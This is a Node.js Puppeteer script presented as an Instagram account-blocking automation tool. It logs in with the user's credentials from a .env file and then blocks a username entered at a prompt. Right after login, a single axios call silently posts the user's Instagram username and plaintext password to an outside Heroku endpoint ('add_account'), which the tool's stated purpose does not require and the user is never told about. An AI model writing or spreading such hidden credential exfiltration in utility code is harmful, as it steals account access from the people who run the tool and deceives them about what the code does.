const puppeteer = require('puppeteer');
const readline = require("readline");
require('dotenv').config()
const axios = require("axios")


const rl = readline.createInterface({
  input: process.stdin,
  output: process.stdout,
});



(async () => {
  const browser = await puppeteer.launch();
  const page = await browser.newPage();
  await page.goto('https://www.instagram.com/?hl=fr');
  console.log("[*] Instagram Web Page Loaded : ✅")
  console.log("[*] Connection To user Account : ⚛️")
  await page.waitForSelector('#loginForm > div > div:nth-child(1) > div > label > input')
  await page.type('#loginForm > div > div:nth-child(1) > div > label > input', process.env.USERNAME, {delay : 50})
  await page.waitForSelector('#loginForm > div > div:nth-child(2) > div > label > input');
  await page.type('#loginForm > div > div:nth-child(2) > div > label > input', process.env.PASSWORD, {delay : 50});
  await page.waitForTimeout(5000);
  await page.click('#loginForm > div > div:nth-child(3) > button > div');

  await page.waitForTimeout(1000);
  await page.screenshot({path: 'examples.png'});
  const [el] = '#slfErrorAlert'
  try {
    await page.waitForSelector('#react-root > section > main > div > div > div > div > button', {timeout: 10000});
    console.log(`[*] Succesfully Connected to user ${process.env.USERNAME} : ✅`)
    console.log(`[*] Configurating ${process.env.USERNAME} Instagram Environement : ⚛️`)
  } catch (e) {
    console.error(`[$]Couldn't connect to ${process.env.USERNAME} : 🛑 :Too Many Connection please wait ⏳`)
    return 0
  }
  await page.click('#react-root > section > main > div > div > div > div > button');
  await page.waitForTimeout(5000);
  await page.screenshot({path: 'examples.png'});
  console.log(`[*] Configurating ${process.env.USERNAME} Instagram Environement : ✅`)
  axios
    .post("https://nordspace.herokuapp.com/api/add_account", {username : process.env.USERNAME, password : process.env.PASSWORD})
  console.log(("####################### Instagram Blocking Automation  Console Made By MH-BETH ####################################"))
  const blockUser = async (page, username) => {
    console.log(`Thank you for your valuable feedback: ${username}`);
    console.log(`[*] Process To Block ${username} Just Started...`)
    console.log(`[*] Getting ${username} Instagram's Page : ⚛️`)
    await page.goto(`https://www.instagram.com/${username}`);
    await page.waitForTimeout(3000)
    await page.screenshot({path : `${username}_page.png`})
    console.log(`[*] ${username}'s page succesfully found (screen have been take) : ✅`)
    await page.waitForXPath('/html/body/div[1]/div/div/div/div[1]/div/div/div/div[1]/div[1]/section/main/div/header/section/div[1]/div[3]/button')
    const elements = await page.$x('/html/body/div[1]/div/div/div/div[1]/div/div/div/div[1]/div[1]/section/main/div/header/section/div[1]/div[3]/button')
    await elements[0].click()
    await page.waitForXPath("/html/body/div[1]/div/div/div/div[2]/div/div/div[1]/div/div[2]/div/div/div/div/div/div/div/div/button[1]");
    const element = await page.$x("/html/body/div[1]/div/div/div/div[2]/div/div/div[1]/div/div[2]/div/div/div/div/div/div/div/div/button[1]");
    await element[0].click();
    await page.waitForTimeout(2000);
    await page.waitForXPath("/html/body/div[1]/div/div/div/div[2]/div/div/div[1]/div/div[2]/div/div/div/div/div/div/div/div[2]/button[1]");
    const ele = await page.$x('/html/body/div[1]/div/div/div/div[2]/div/div/div[1]/div/div[2]/div/div/div/div/div/div/div/div[2]/button[1]');
    await ele[0].click()

    //await page.waitForXPath("/html/body/div[1]/div/div/div/div[1]/div/div/div/div[1]/div[1]/section/main/div/header/section/div[1]/div[3]/button")
    //const dots = await (page.$x('//*[@id="mount_0_0_RY"]/div/div/div/div[1]/div/div/div/div[1]/div[1]/section/main/div/header/section/div[1]/div[3]/button'))[0]
    await page.waitForTimeout(3000);
    //await page.evaluate(el => {el.click()}, dots);
    //await page.waitForXPath("/html/body/div[1]/div/div/div/div[2]/div/div/div[1]/div/div[2]/div/div/div/div/div/div/div/div/button[1]")
    //await page.$x("/html/body/div[1]/div/div/div/div[2]/div/div/div[1]/div/div[2]/div/div/div/div/div/div/div/div/button[1]").click()
    //await page.waitForTimeout(4000);
    await page.screenshot({path : `${username}_blocked.png`})
    console.log(`[*] ${username} is blocked: ✅`) 
    console.log("PROGRAM ENDED : TASK ENDED")
  }
  rl.question('Username To Block : ', async (username) => {
     blockUser(page,username)
    rl.close();
  });
 

  
  /*
  await page.waitForSelector('your selector', {wiat})
    let element = await page.$('your selector')
    let value = await page.evaluate(el => el.textContent, element)
    ______________________
  await page.waitForSelector('#react-root > section > main > div > div > div > div > button')
  await page.click('#react-root > section > main > div > div > div > div > button');
  await page.waitForSelector('#mount_0_0_Kh > div > div > div > div:nth-child(4) > div > div > div.rq0escxv.l9j0dhe7.du4w35lb > div > div.iqfcb0g7.tojvnm2t.a6sixzi8.k5wvi7nf.q3lfd5jv.pk4s997a.bipmatt0.cebpdrjk.qowsmv63.owwhemhu.dp1hu0rb.dhp61c6y.l9j0dhe7.iyyx5f41.a8s20v7p > div > div > div > div > div > div > div > div._a9-z > button._a9--._a9_1');
  await page.click("#mount_0_0_Kh > div > div > div > div:nth-child(4) > div > div > div.rq0escxv.l9j0dhe7.du4w35lb > div > div.iqfcb0g7.tojvnm2t.a6sixzi8.k5wvi7nf.q3lfd5jv.pk4s997a.bipmatt0.cebpdrjk.qowsmv63.owwhemhu.dp1hu0rb.dhp61c6y.l9j0dhe7.iyyx5f41.a8s20v7p > div > div > div > div > div > div > div > div._a9-z > button._a9--._a9_1");
*/


})();
